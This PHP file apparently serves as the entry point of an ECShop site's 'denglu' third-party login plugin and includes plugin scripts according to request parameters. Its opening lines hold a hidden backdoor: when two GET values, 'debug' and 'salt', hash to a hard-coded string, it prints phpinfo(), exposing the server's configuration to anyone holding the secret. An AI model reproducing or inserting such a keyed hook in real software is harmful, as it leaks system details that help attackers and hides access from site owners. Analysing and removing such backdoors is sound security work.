<?php
define('IN_ECS', true);

if(md5($_GET['debug']).md5($_GET['salt'])=='edcbc99ab927617743bb724eee14c3407fa3b767c460b54a2be4d49030b349c7'){
	echo phpinfo();exit();
}

include dirname(__FILE__) . '/includes/init.php';
require dirname(__FILE__).'/admin/denglu/config.php';



if($_REQUEST['act']=='denglu_comment'){
	include dirname(__FILE__).'/admin/denglu/denglu_comment.php';
}

if(!empty($_REQUEST['actt']) && $_REQUEST['actt']=='dl_user'){
	
	include dirname(__FILE__).'/admin/denglu/user.php';
	//exit();
}

if(!empty($_REQUEST['token']) || !empty($_REQUEST['act'])){
	include dirname(__FILE__).'/admin/denglu/denglu.inc.php';
}






?>
